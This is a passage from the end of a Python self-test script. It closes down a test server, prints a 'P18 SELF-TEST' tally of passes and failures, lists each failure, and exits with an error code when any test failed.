        srv.shutdown()
        try:
            srv.server_close()
        except Exception:
            pass
    print("\n" + "=" * 53)
    print(" P18 SELF-TEST: %d PASS / %d FAIL" % (len(PASS), len(FAIL)))
    if FAIL:
        for n, d in FAIL:
            print("  FAIL: %s -> %s" % (n, str(d)[:140]))
        sys.exit(1)
    print(" ALL GREEN \u2705")


if __name__ == "__main__":
    main()
